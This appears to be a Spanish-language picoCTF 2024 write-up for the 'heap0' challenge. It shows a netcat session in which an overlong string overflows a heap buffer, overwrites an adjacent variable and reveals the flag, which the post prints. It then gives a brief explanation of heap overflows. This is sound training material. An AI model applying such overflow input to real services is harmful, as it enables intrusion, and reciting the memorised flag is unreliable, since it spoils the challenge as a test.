## Objetivo
Are overflows just a stack concern?Download the binary [here](https://artifacts.picoctf.net/c_tethys/28/chall).Download the source [here](https://artifacts.picoctf.net/c_tethys/28/chall.c).

Additional details will be available after launching your challenge instance.

## Pistas

## Solución
1. Dentro de picoCTF iniciar la instancia y copiar el comando
2. Ir a terminal de Linux y hacer lo siguiente:
```
kali@kali:~/Documents/picoCTF/picoCTF2024$ mkdir heap0

kali@kali:~/Documents/picoCTF/picoCTF2024$ cd heap0/

kali@kali:~/Documents/picoCTF/picoCTF2024/heap0$ nc tethys.picoctf.net 60846

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x55ea207332b0  ->   pico
+-------------+----------------+
[*]   0x55ea207332d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x55ea207332b0  ->   qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm
+-------------+----------------+
[*]   0x55ea207332d0  ->   uiopasdfghjklzxcvbnm
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{my_first_heap_overflow_76775c7c}

```
3.La bandera es :
picoCTF{my_first_heap_overflow_76775c7c}
## Notas adicionales
* Un desbordamiento de montículo o heap overflow es un tipo de desbordamiento del buffer de una computadora donde el buffer puede ser sobrescrito si está asignado en una porción del heap. 
## Referencias
https://cwe.mitre.org/data/definitions/122.html